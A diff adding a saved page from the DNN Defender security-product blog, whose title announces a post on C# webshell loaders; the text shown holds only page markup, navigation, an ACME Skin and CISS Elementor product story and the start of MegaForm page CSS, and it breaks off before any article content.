@@ -1,0 +1,1455 @@
+<!DOCTYPE html>
+<html  lang="en-US" dir="ltr">
+<head id="Head"><meta content="text/html; charset=UTF-8" http-equiv="Content-Type" /><title>
+	Blog (RC Version: 10.2.3.0)
+</title><meta id="MetaDescription" name="description" content="DNN Defender is a security module for DNN Platform that protects websites from webshells, backdoors, and malicious file uploads using real-time file monitoring and offline malware detection. Designed for low resource usage and full administrator control.
+" /><meta id="MetaKeywords" name="keywords" content="DNN security,
+DotNetNuke security,
+webshell detection,
+ASPX webshell,
+malicious file upload,
+post-exploitation detection,
+backdoor detection,
+file integrity monitoring,
+real-time file monitoring,
+offline malware detection
+
+" /><meta id="MetaRobots" name="robots" content="INDEX, FOLLOW" /><link href="/Portals/0-System/dnn-css-variables.css?cdv=216" rel="stylesheet" /><link href="/Resources/Shared/stylesheets/dnndefault/10.0.0/default.css?cdv=216" rel="stylesheet" /><link href="/Portals/_default/admin.css?cdv=216" rel="stylesheet" /><link href="/DesktopModules/Blog/module.css?cdv=216" rel="stylesheet" /><link href="/DesktopModules/Blog/Templates/_default/template.css?cdv=216" rel="stylesheet" /><link href="/DesktopModules/Blog/Templates/_default/css/colorbox.css?cdv=216" rel="stylesheet" /><link href="/DesktopModules/Blog/Templates/_default/css/shCore.css?cdv=216" rel="stylesheet" /><link href="/DesktopModules/Blog/Templates/_default/css/shCoreDefault.css?cdv=216" rel="stylesheet" /><link href="/Portals/_default/Skins/Aperture/css/skin.min.css?cdv=216" rel="stylesheet" /><script src="/Resources/libraries/jQuery/03_07_01/jquery.js?cdv=216" type="text/javascript"></script><script src="/Resources/libraries/jQuery-Migrate/03_04_01/jquery-migrate.js?cdv=216" type="text/javascript"></script><script src="/Resources/libraries/jQuery-UI/01_14_01/jquery-ui.min.js?cdv=216" type="text/javascript"></script><script src="/Resources/libraries/HoverIntent/01_10_01/jquery.hoverIntent.min.js?cdv=216" type="text/javascript"></script><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Bold.woff2" type="font/woff2" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-BoldItalic.woff2" type="font/woff2" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Italic.woff2" type="font/woff2" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Light.woff2" type="font/woff2" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-LightItalic.woff2" type="font/woff2" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Medium.woff2" type="font/woff2" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-MediumItalic.woff2" type="font/woff2" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Regular.woff2" type="font/woff2" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Bold.woff" type="font/woff" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-BoldItalic.woff" type="font/woff" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Italic.woff" type="font/woff" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Light.woff" type="font/woff" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-LightItalic.woff" type="font/woff" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Medium.woff" type="font/woff" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-MediumItalic.woff" type="font/woff" crossorigin="anonymous" /><link rel="preload" as="font" href="/Portals/_default/Skins/Aperture/fonts/Ubuntu-Regular.woff" type="font/woff" crossorigin="anonymous" /><link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/DesktopModules/Blog/API/Modules/Manifest?TabId=39&amp;ModuleId=404" /><meta id="ogurl" property="og:url" content="https://dnndefender.com/Blogs/Post/186/Modern-Webshells-2024-2026-Minimal-C-Loader-Techniques-with-Encrypted-Payloads-from-C2-and-How-They-Bypass-Detection" /><meta content="https://dnndefender.com/Blogs/Post/186/Modern-Webshells-2024-2026-Minimal-C-Loader-Techniques-with-Encrypted-Payloads-from-C2-and-How-They-Bypass-Detection" name="twitter:url"><meta id="ogtitle" property="og:title" content="Modern Webshells 2024–2026: Minimal C# Loader Techniques with Encrypted Payloads from C2 and How They Bypass Detection" /><meta content="Modern Webshells 2024–2026: Minimal C# Loader Techniques with Encrypted Payloads from C2 and How They Bypass Detection" name="twitter:title"><meta id="ogdescription" property="og:description" content=" Posted on: February 13, 2026 | Author: Hung 
+
+ Today, we will examine one of the detection capabilities that the DNNDefender module is designed to provide—specifically, the types of stealth techniques that are often overlooked by traditional antivirus engines or hosting-level firewalls. While AV solutions typically rely on signatures and generic heuristics, and hosting firewalls focus on network-layer filtering, modern loader-based implants often operate within legitimate IIS and .NET execution flows, making them far harder to identify. 
+" /><meta content=" Posted on: February 13, 2026 | Author: Hung 
+
+ Today, we will examine one of the detection capabilities that the DNNDefender module is designed to provide—specifically, the types of stealth techniques that are often overlooked by traditional antivirus engines or hosting-level firewalls. While AV solutions typically rely on signatures and generic heuristics, and hosting firewalls focus on network-layer filtering, modern loader-based implants often operate within legitimate IIS and .NET execution flows, making them far harder to identify. 
+" name="twitter:description"><meta id="ogsitename" property="og:site_name" content="DNN Defender – Webshell and Malware Protection for DNN" /><meta id="ogtype" property="og:type" content="article" /><meta id="oglocale" property="og:locale" content="en_US" /><meta id="ogupdatedtime" property="og:updated_time" content="2026-02-12 20:11:51Z" /><link rel="pingback" href="https://dnndefender.com/DesktopModules/Blog/API/Comments/Pingback?tabId=39&amp;moduleId=404&amp;blogId=5&amp;postId=186"></link><meta name="viewport" content="width=device-width, initial-scale=1.0" /></head>
+<body id="Body">
+
+    <form method="post" action="/Blogs/Post/186/Modern-Webshells-2024-2026-Minimal-C-Loader-Techniques-with-Encrypted-Payloads-from-C2-and-How-They-Bypass-Detection" id="Form" enctype="multipart/form-data">
+<div class="aspNetHidden">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="QQqXUzNeiFK0QWsqEdWdCWgQjwzsQkP11I6y89qo1plTmtydKiRalGAPGc0pV6ZylpHYcKqFGFPIP00u0MXXbdqzQjSTiL2IyjshOkezM5hAKWulDf82KeBV+o7zyFcCq/c8WhfNNZxc5IE/kJIfPbnevxoDHRGpo7zHD68cWFE2EJJ1B0uFwtgZ9LpaLnIiMiaEd/RyiJGC66/YpCVAy4CSsRZtqJF1/yNRJc+dRvYluKhm2jphym0aJtS2SLaD8r9rpQjeobC3eAYtUJdag+qa91FgT8xzyiIZi36GBXCLp/9V7TfUqFH6B2DW9dXkBswNGoIPDhDEcT6wKujXCo4gHu4=" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['Form'];
+if (!theForm) {
+    theForm = document.Form;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=pynGkmcFUV1hN_Rl0lnjQROt0z3fDQZVcKiSgFW8Gn9nhCKnvC13CUvmWVI1&amp;t=638901274312636832" type="text/javascript"></script>
+
+<script type="text/javascript">
+//<![CDATA[
+var appPath=''
+//]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+var blogService
+jQuery(function ($) {
+ blogService = new BlogService($, {
+   serverErrorText: 'An error occurred while processing the request. Please try again later.',
+   serverErrorWithDescriptionText: 'An error occurred while processing the request: ',
+   errorBoxId: '#blogServiceErrorBox404'
+  },
+  404);
+});
+
+//]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+(function ($, Sys) {$(document).ready(function () {setTimeout(function(){blogService.viewPost(5, 186)},60000)});} (jQuery, window.Sys));//]]>
+</script>
+
+<script src="/ScriptResource.axd?d=uHIkleVeDJcLAPluXMw3DDzyPbtZ4KU_OGdt3MXIMnnEyzOzwtLBCw9zQCdL2HqAxIOrWCUGdkPzGjop6SJcovFf75QrDTdohy9K3FOehlqloJGTNWKScGxglDTYYo3QImJU0A2&amp;t=345ad968" type="text/javascript"></script>
+<script src="/ScriptResource.axd?d=Jw6tUGWnA17Em-FINtVqKGgyIUz7g2dhcctiUKUvYGGX_r4Uf6K-baQWmZmn6WMBSwrYbMZQgoiF6rDr7lHNxznOD89Frww4Lru2JfMV5jm9gYOSADMWI8RtM3Xf5epfhk_dEidBY1O7gs2V0&amp;t=345ad968" type="text/javascript"></script>
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" />
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="QEFTInLvvjG3r4d7SOwTZfereryQCfxAQqt5JBKKKrzXiLmb33zp/eMbG4oQYnbE9cqYJP+6ylxQw+U/9vjiA0h0TTR+/0arPRfEDbC+8/bUC8Wt" />
+</div>
+<script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ScriptManager', 'Form', [], [], [], 5400, '');
+//]]>
+</script>
+
+        <script src="/js/dnn.js?cdv=216" type="text/javascript"></script><script src="/DesktopModules/Blog/js/jquery.timeago.js?_=0.0.0?cdv=216" type="text/javascript"></script><script src="/DesktopModules/Blog/js/en/jquery.timeago.en.js?_=0.0.0?cdv=216" type="text/javascript"></script><script src="/DesktopModules/Blog/js/dotnetnuke.blog.js?_=0.0.0?cdv=216" type="text/javascript"></script><script src="/js/dnncore.js?cdv=216" type="text/javascript"></script><script src="/js/dnn.servicesframework.js?cdv=216" type="text/javascript"></script><script src="/DesktopModules/Blog/Templates/_default/template.js?cdv=216" type="text/javascript"></script><script src="/DesktopModules/Blog/Templates/_default/js/jquery.colorbox.js?cdv=216" type="text/javascript"></script><script src="/DesktopModules/Blog/Templates/_default/js/jquery.sharrre.min.js?cdv=216" type="text/javascript"></script><script src="/DesktopModules/Blog/Templates/_default/js/moment-with-locales.min.js?cdv=216" type="text/javascript"></script><script src="/DesktopModules/Blog/Templates/_default/js/shCore.js?cdv=216" type="text/javascript"></script><script src="/Resources/libraries/DnnPlugins/10_02_03/dnn.jquery.js?cdv=216" type="text/javascript"></script>
+        
+        
+        
+
+
+
+
+
+
+
+<div class="aperture-theme">
+  <!-- Header/NavBar -->
+  <header class="aperture-header">
+  <div class="eyebrow-bar">
+    <div class="aperture-container">
+      <a id="dnn_dnnLogin_loginLink" title="Login" class="SkinObject" rel="nofollow" onclick="this.disabled=true;" href="https://dnndefender.com/Login?returnurl=%2fBlogs%2fPost%2f186%2fModern-Webshells-2024-2026-Minimal-C-Loader-Techniques-with-Encrypted-Payloads-from-C2-and-How-They-Bypass-Detection">Login</a>
+
+      <a id="dnn_dnnUser_registerLink" title="Register" class="SkinObject" rel="nofollow" href="https://dnndefender.com/Register?returnurl=https%3a%2f%2fdnndefender.com%2fBlogs">Register</a>
+
+    </div>
+  </div>
+  <div class="logo-menu-bar">
+    <div class="aperture-container">
+      <a id="dnn_dnnLOGO_hypLogo" title="DNN Defender – Webshell &amp; Malware Protection for DNN" aria-label="DNN Defender – Webshell &amp; Malware Protection for DNN" href="https://dnndefender.com/"><img id="dnn_dnnLOGO_imgLogo" src="/Portals/0/logoDNNDefender.png?ver=gSSn7mTcZqWJ69UvZPBRgg%3d%3d" alt="DNN Defender – Webshell &amp; Malware Protection for DNN" /></a>
+      <ul class="desktop-menu h-100" id="nav-desktop">
+            <li class="">
+            <a href="https://dnndefender.com/" >
+                DNNDEFENDER
+            </a>
+        </li>
+        <li class="">
+            <a href="https://dnndefender.com/Demo-Defender" >
+                Demo Defender
+                    <span>&nbsp;&#x25BC;</span>
+            </a>
+                <ul>
+                            <li class="">
+            <a href="https://dnndefender.com/Demo-Defender/Trial" >
+                Trial
+            </a>
+        </li>
+        <li class="">
+            <a href="https://dnndefender.com/Demo-Defender" >
+                Dnndefender Demo
+            </a>
+        </li>
+
+                </ul>
+        </li>
+        <li class="selected">
+            <a href="https://dnndefender.com/Blogs" >
+                Blogs
+            </a>
+        </li>
+        <li class="">
+            <a href="https://dnndefender.com/acmecorp" >
+                ACME SKINS SYSTEM
+            </a>
+        </li>
+        <li class="">
+            <a href="https://dnndefender.com/MegaForm" >
+                MegaForm
+            </a>
+        </li>
+
+</ul>
+
+
+      <span class="mobile-menu" id="nav-mobile">
+    <div id="menuToggle">
+        <input type="checkbox" />
+        <span></span>
+        <span></span>
+        <span></span>
+        <nav role="navigation" class="nav-drill" id="nav-mobile">
+            <ul class="nav-items">
+                        <li class="nav-item ">
+                <a class="nav-link" href="https://dnndefender.com/" >DNNDEFENDER</a>
+
+        </li>
+        <li class="nav-item nav-expand aperture-d-flex aperture-align-items-center">
+                <a class="nav-link" href="https://dnndefender.com/Demo-Defender" >Demo Defender</a>
+
+                <a href="javascript:void(0);" class="nav-link nav-expand-link">&gt;</a>
+                <ul class="nav-items nav-expand-content">
+                    <li class="nav-item">
+                        <a class="nav-link nav-back-link" href="javascript:void(0);">
+                            &lt;&nbsp; Back to Demo Defender
+                        </a>
+                    </li>
+                            <li class="nav-item ">
+                <a class="nav-link" href="https://dnndefender.com/Demo-Defender/Trial" >Trial</a>
+
+        </li>
+        <li class="nav-item ">
+                <a class="nav-link" href="https://dnndefender.com/Demo-Defender" >Dnndefender Demo</a>
+
+        </li>
+
+                </ul>
+        </li>
+        <li class="nav-item selected">
+                <a class="nav-link" href="https://dnndefender.com/Blogs" >Blogs</a>
+
+        </li>
+        <li class="nav-item ">
+                <a class="nav-link" href="https://dnndefender.com/acmecorp" >ACME SKINS SYSTEM</a>
+
+        </li>
+        <li class="nav-item ">
+                <a class="nav-link" href="https://dnndefender.com/MegaForm" >MegaForm</a>
+
+        </li>
+
+            </ul>
+        </nav>
+    </div>
+</span>
+
+
+
+    </div>
+  </div>
+</header>
+  
+  <!-- Main Content -->
+  <main class="aperture-main">
+    <div id="dnn_BannerPane"><div class="DnnModule DnnModule-DNN_HTML DnnModule-19031 DnnVersionableControl"><a name="19031"></a><div id="dnn_ctr19031_ContentPane"><!-- Start_Module_19031 --><div id="dnn_ctr19031_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr19031_HtmlModule_lblContent" class="Normal">
+	 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>ACME Skin &amp; CISS Elementor &mdash; A Standard DNN Skin, Built for Speed</title>
+<style>
+  .acme-blog { font-family: "Inter", "Segoe UI", -apple-system, BlinkMacSystemFont, system-ui, sans-serif; color: #1f2937; -webkit-font-smoothing: antialiased; max-width: 820px; margin: 0 auto; padding: 32px 24px 64px; line-height: 1.7; }
+  .acme-blog .acme-eyebrow { color: #df0000; font-size: 12.5px; font-weight: 800; letter-spacing: .22em; text-transform: uppercase; margin: 0 0 14px; }
+  .acme-blog h1 { font-size: 42px; line-height: 1.18; margin: 0 0 14px; font-weight: 800; letter-spacing: -.022em; color: #0f172a; }
+  .acme-blog .acme-dek { font-size: 19px; line-height: 1.55; color: #475569; margin: 0 0 32px; font-weight: 400; }
+  .acme-blog h2 { font-size: 26px; line-height: 1.3; margin: 44px 0 14px; font-weight: 700; letter-spacing: -.012em; color: #0f172a; }
+  .acme-blog h3 { font-size: 18px; line-height: 1.4; margin: 30px 0 8px; font-weight: 700; color: #0f172a; }
+  .acme-blog p { font-size: 16px; line-height: 1.7; color: #334155; margin: 0 0 18px; }
+  .acme-blog p strong { color: #0f172a; font-weight: 700; }
+  .acme-blog a { color: #df0000; text-decoration: none; border-bottom: 1px solid rgba(223, 0, 0, .25); }
+  .acme-blog ul { margin: 0 0 22px; padding-left: 24px; }
+  .acme-blog ul li { font-size: 16px; line-height: 1.65; color: #334155; margin-bottom: 6px; }
+  .acme-blog ul li strong { color: #0f172a; font-weight: 700; }
+  .acme-blog blockquote { margin: 28px 0; padding: 18px 22px; border-left: 4px solid #df0000; background: #fafafa; font-size: 17px; line-height: 1.6; color: #1f2937; font-style: normal; }
+  .acme-blog blockquote p { margin: 0; font-size: 17px; color: #1f2937; }
+  .acme-blog hr { border: 0; border-top: 1px solid #e2e8f0; margin: 36px 0; }
+  .acme-blog .acme-meta { display: flex; align-items: center; gap: 12px; margin: 0 0 26px; padding-bottom: 22px; border-bottom: 1px solid #e2e8f0; font-size: 13.5px; color: #64748b; }
+  .acme-blog .acme-meta .acme-avatar { width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(135deg, #df0000, #8b0000); color: #fff; display: inline-grid; place-items: center; font-weight: 800; font-size: 15px; flex: 0 0 auto; }
+  .acme-blog .acme-meta b { color: #0f172a; font-weight: 700; }
+  .acme-blog .acme-tags { margin-top: 36px; padding-top: 22px; border-top: 1px solid #e2e8f0; }
+  .acme-blog .acme-tags span { display: inline-block; margin: 0 6px 6px 0; padding: 4px 12px; border-radius: 999px; background: #f1f5f9; color: #475569; font-size: 12.5px; font-weight: 600; }
+</style>
+</head>
+<body>
+
+<article class="acme-blog">
+
+  <p class="acme-eyebrow">Product story &middot; ACME Skin &amp; CISS Elementor</p>
+
+  <h1>A Standard DNN Skin, Built for the Way Sites Actually Get Made</h1>
+
+  <p class="acme-dek">A collection of theme designs, dropped into one set of multi-purpose panes &mdash; with menus and content created visually, by the people who own the site.</p>
+
+  <div class="acme-meta">
+    <span class="acme-avatar">A</span>
+    <span><b>ACME Team</b> &middot; dnndefender.com &middot; 7 min read</span>
+  </div>
+
+  <p>For a long time, building a DotNetNuke site felt like a tradeoff. Either you went with a stock theme and lived inside its limits, or you commissioned a custom skin and waited weeks for every layout change. Marketing wanted to ship; developers wanted to keep things clean; editors wanted to stop opening tickets just to move a button. The gap between the three only grew with every release.</p>
+
+  <p>That is the gap ACME Skin and CISS were built to close. We did not set out to invent a new module system, a parallel content store, or a proprietary template language. We set out to make a <strong>standard DNN skin</strong> &mdash; the kind any DNN developer can read, fork, or extend &mdash; that ships with everything an editor needs to put together a real site in a single afternoon.</p>
+
+  <h2>One pane system. A whole collection of designs.</h2>
+
+  <p>ACME Skin is, at its core, a single layout: a set of multi-purpose panes that handle the header, the drawer, the hero, the content area, and the footer. What changes is not the structure, but the design dropped into it. We ship a growing <strong>collection of theme designs</strong> &mdash; corporate, editorial, hospitality, education, healthcare, and more &mdash; all rendered through the same panes.</p>
+
+  <p>That means you can switch a portal from "professional services firm" to "campus landing page" without rebuilding the structure underneath. New child portal? Pick a design, set the brand colour, ship. The skin file is honest DNN markup &mdash; no obscure tokens, no proprietary descriptors &mdash; so the DNN team you already have can read it on day one.</p>
+
+  <h3>What multi-purpose panes really means</h3>
+
+  <p>Most skins assume the editor knows where things are supposed to go. ACME flips that: every pane is a generic surface that accepts any module &mdash; standard DNN Text/HTML, a CISS block, a third-party module &mdash; and renders it with consistent spacing, typography, and responsive behaviour. The editor stops thinking about "which pane do I drop this in?" and starts thinking about the page.</p>
+
+  <h2>CISS Elementor: every essential block, no custom module per page</h2>
+
+  <p>The pane system would not matter much if filling those panes still required a developer. So we built CISS &mdash; an in-page <strong>Elementor</strong> that ships every essential content block an editor needs:</p>
+
+  <ul>
+    <li><strong>Hero sections</strong> with eyebrow, title, subtitle, dual CTAs, background image and theme variants.</li>
+    <li><strong>Image sliders and carousels</strong> with optional album filtering and CSS-driven swipe.</li>
+    <li><strong>Tabs and events lists</strong> with structured per-event fields and category filters.</li>
+    <li><strong>Photo galleries</strong> with multiple albums, cover images, captions, and a built-in lightbox.</li>
+    <li><strong>A shared media library</strong> so a photo you uploaded for one gallery is instantly available everywhere.</li>
+  </ul>
+
+  <p>Every block is configured in a small floating editor, previewed live, and inserted as a standard Text/HTML module. There is no custom database table, no module-per-page proliferation, no runtime JavaScript required on the visitor side. The output is plain, server-rendered HTML and CSS &mdash; the kind search engines actually index, the kind that survives a DNN upgrade.</p>
+
+  <blockquote>
+    <p>In other words, CISS lets editors compose pages directly &mdash; without inventing a parallel content system. The HTML it produces is the HTML DNN already understands.</p>
+  </blockquote>
+
+  <h2>Menu Builder: visual menus, no markup</h2>
+
+  <p>Menus are the other place where the gap between editors and developers shows up. We built a visual <strong>Menu Builder</strong> that lets the people who own the site information architecture &mdash; not the developers &mdash; arrange every menu item in the browser. Drag to reorder, group items into mega-menu panels, add badges and icons, set per-role visibility, and preview the result instantly. The configuration travels with the portal export, so what you build on staging is exactly what ships.</p>
+
+  <p>You can present the same menu as a wide <strong>mega menu</strong> for comprehensive sites with many destinations, or as a slide-out <strong>drawer menu</strong> for sites that want a minimal header and an app-like feel. One configuration, two presentation modes &mdash; pick the one that matches the audience.</p>
+
+  <h2>Why this matters in practice</h2>
+
+  <p>The combination is what makes the workflow fast. Pick an ACME design. Build the menu in the Menu Builder. Drop hero, slider, gallery and events blocks via the CISS Elementor. You have a live site, hosted in standard DNN, indexable by search engines, editable by non-developers, in an afternoon. Need a second portal next week? Pick a different design and repeat.</p>
+
+  <p>And because nothing about ACME or CISS is proprietary lock-in, the DNN team can still do everything they have always done. Custom modules still work. Existing skins can coexist on other portals. Your developers are not boxed in &mdash; they just get to spend their time on the parts that genuinely need them.</p>
+
+  <hr>
+
+  <p>ACME Skin and CISS are available now for DotNetNuke 9.4 and later. You can see the live demo and read the install guide at <a href="https://www.dnndefender.com">dnndefender.com</a>. If you want to discuss bringing this workflow to your team, write to support@dnndefender.com &mdash; we read every email.</p>
+
+  <div class="acme-tags">
+    <span>DotNetNuke</span>
+    <span>ACME Skin</span>
+    <span>CISS</span>
+    <span>Elementor</span>
+    <span>Menu Builder</span>
+    <span>Mega Menu</span>
+    <span>Drawer Menu</span>
+  </div>
+
+</article>
+
+</body>
+</html>
+
+</div>
+
+</div><!-- End_Module_19031 --></div>
+</div><div class="DnnModule DnnModule-DNN_HTML DnnModule-420 DnnVersionableControl"><a name="420"></a><div id="dnn_ctr420_ContentPane"><!-- Start_Module_420 --><div id="dnn_ctr420_ModuleContent" class="DNNModuleContent ModDNNHTMLC">
+	<div id="dnn_ctr420_HtmlModule_lblContent" class="Normal">
+	<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MegaForm for DNN - Modern Self-Hosted Form Server</title>
+  <style>
+    :root{
+      --bg:#f4f7fc;
+      --card:#ffffff;
+      --text:#18212f;
+      --muted:#5f6b7a;
+      --line:#dce5f0;
+      --primary:#2563eb;
+      --primary-2:#1d4ed8;
+      --soft:#eef4ff;
+      --dark:#0f172a;
+      --success:#0f766e;
+      --accent:#7c3aed;
+      --warm:#ea580c;
+      --shadow:0 18px 50px rgba(15,23,42,.08);
+      --radius:20px;
+    }
+
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family:Arial, Helvetica, sans-serif;
+      background:linear-gradient(180deg,#f8fbff 0%,#eef4fb 100%);
+      color:var(--text);
+      line-height:1.7;
+    }
+
+    .container{
+      width:min(1160px, calc(100% - 32px));
+      margin:0 auto;
+      padding:28px 0 56px;
+    }
+
+    .hero{
+      background:
+        radial-gradient(circle at top right, rgba(255,255,255,.18), transparent 30%),
+        linear-gradient(135deg, #0f172a 0%, #1d4ed8 55%, #0ea5e9 100%);
+      color:#fff;
+      border-radius:28px;
+      padding:42px 34px;
+      box-shadow:var(--shadow);
+      position:relative;
+      overflow:hidden;
+    }
+
+    .hero:after{
+      content:"";
+      position:absolute;
+      right:-80px;
+      bottom:-80px;
+      width:240px;
+      height:240px;
+      border-radius:50%;
+      background:rgba(255,255,255,.08);
+    }
+
+    .eyebrow{
+      display:inline-block;
+      padding:8px 12px;
+      border-radius:999px;
+      background:rgba(255,255,255,.14);
+      font-size:12px;
+      text-transform:uppercase;
+      letter-spacing:.08em;
+      font-weight:700;
+      margin-bottom:14px;
+    }
+
+    h1{
+      margin:0 0 14px;
+      font-size:44px;
+      line-height:1.1;
+      max-width:900px;
+    }
+
+    .hero p{
+      margin:0;
+      max-width:900px;
+      font-size:18px;
+      color:rgba(255,255,255,.92);
+    }
+
+    .tabs{
+      margin-top:26px;
+      background:var(--card);
+      border:1px solid var(--line);
+      border-radius:26px;
+      overflow:hidden;
+      box-shadow:var(--shadow);
+    }
+
+    .tabs input[type="radio"]{
+      display:none;
+    }
+
+    .tab-labels{
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      padding:18px;
+      background:#f9fbff;
+      border-bottom:1px solid var(--line);
+    }
+
+    .tab-labels label{
+      cursor:pointer;
+      padding:12px 16px;
+      border-radius:999px;
+      border:1px solid var(--line);
+      background:#fff;
+      font-weight:700;
+      color:var(--dark);
+      transition:.2s ease;
+      font-size:14px;
+    }
+
+    .tab-labels label:hover{
+      background:#f7fbff;
+      border-color:#bfd3ff;
+    }
+
+    .content{
+      padding:0;
+    }
+
+    .tab-content{
+      display:none;
+      padding:30px 26px 34px;
+    }
+
+    #tab1:checked ~ .tab-labels label[for="tab1"],
+    #tab2:checked ~ .tab-labels label[for="tab2"],
+    #tab3:checked ~ .tab-labels label[for="tab3"],
+    #tab4:checked ~ .tab-labels label[for="tab4"],
+    #tab5:checked ~ .tab-labels label[for="tab5"]{
+      background:var(--soft);
+      border-color:#bdd0ff;
+      color:var(--primary);
+    }
+
+    #tab1:checked ~ .content #content1,
+    #tab2:checked ~ .content #content2,
+    #tab3:checked ~ .content #content3,
+    #tab4:checked ~ .content #content4,
+    #tab5:checked ~ .content #content5{
+      display:block;
+    }
+
+    .section-heading{
+      margin-bottom:18px;
+    }
+
+    .section-heading h2{
+      margin:0 0 8px;
+      font-size:34px;
+      line-height:1.15;
+      color:var(--dark);
+    }
+
+    .section-heading p{
+      margin:0;
+      max-width:900px;
+      color:var(--muted);
+      font-size:17px;
+    }
+
+    p{
+      margin:0 0 14px;
+      color:var(--muted);
+    }
+
+    .lead{
+      font-size:18px;
+      color:#334155;
+    }
+
+    .quote{
+      border-left:4px solid var(--primary);
+      background:#f8fbff;
+      border-radius:0 14px 14px 0;
+      padding:16px 18px;
+      margin:18px 0;
+      color:#334155;
+    }
+
+    .blog-card{
+      background:#fff;
+      border:1px solid var(--line);
+      border-radius:20px;
+      padding:24px;
+      box-shadow:0 10px 30px rgba(15,23,42,.04);
+    }
+
+    .feature-grid{
+      display:grid;
+      grid-template-columns:repeat(4,1fr);
+      gap:16px;
+      margin-top:20px;
+    }
+
+    .feature{
+      padding:20px;
+      border-radius:18px;
+      background:#fff;
+      border:1px solid var(--line);
+    }
+
+    .feature .icon{
+      width:44px;
+      height:44px;
+      border-radius:14px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      margin-bottom:14px;
+      font-size:20px;
+      font-weight:700;
+      color:#fff;
+    }
+
+    .feature:nth-child(1) .icon{background:linear-gradient(135deg,#2563eb,#60a5fa)}
+    .feature:nth-child(2) .icon{background:linear-gradient(135deg,#7c3aed,#a78bfa)}
+    .feature:nth-child(3) .icon{background:linear-gradient(135deg,#0f766e,#2dd4bf)}
+    .feature:nth-child(4) .icon{background:linear-gradient(135deg,#ea580c,#fb923c)}
+
+    .feature h3{
+      margin:0 0 8px;
+      font-size:20px;
+      color:var(--dark);
+    }
+
+    .feature p{
+      margin:0;
+      color:var(--muted);
+    }
+
+    .widget-grid{
+      display:grid;
+      grid-template-columns:repeat(4,1fr);
+      gap:16px;
+      margin-top:20px;
+    }
+
+    .widget{
+      background:#fff;
+      border:1px solid var(--line);
+      border-radius:18px;
+      padding:20px;
+      position:relative;
+      overflow:hidden;
+    }
+
+    .widget:before{
+      content:"";
+      position:absolute;
+      left:0;
+      top:0;
+      right:0;
+      height:4px;
+      background:linear-gradient(90deg,var(--primary),var(--accent),var(--warm));
+    }
+
+    .widget-badge{
+      display:inline-block;
+      margin-bottom:12px;
+      padding:6px 10px;
+      border-radius:999px;
+      background:var(--soft);
+      color:var(--primary);
+      font-size:12px;
+      font-weight:700;
+      text-transform:uppercase;
+      letter-spacing:.04em;
+    }
+
+    .widget h3{
+      margin:0 0 8px;
+      font-size:19px;
+      color:var(--dark);
+    }
+
+    .widget p{
+      margin:0;
+      color:var(--muted);
+      font-size:15px;
+    }
+
+    .split{
+      display:grid;
+      grid-template-columns:1.15fr .85fr;
+      gap:20px;
+      align-items:stretch;
+      margin-top:18px;
+    }
+
+    .card{
+      background:#fff;
+      border:1px solid var(--line);
+      border-radius:20px;
+      padding:24px;
+      box-shadow:0 10px 30px rgba(15,23,42,.04);
+    }
+
+    .card h3{
+      margin:0 0 12px;
+      font-size:25px;
+      color:var(--dark);
+    }
+
+    ul{
+      margin:10px 0 16px 20px;
+      color:var(--muted);
+    }
+
+    li{
+      margin:6px 0;
+    }
+
+    .checklist{
+      list-style:none;
+      padding:0;
+      margin:14px 0 0;
+    }
+
+    .checklist li{
+      margin:10px 0;
+      padding-left:28px;
+      position:relative;
+      color:var(--muted);
+    }
+
+    .checklist li:before{
+      content:"✓";
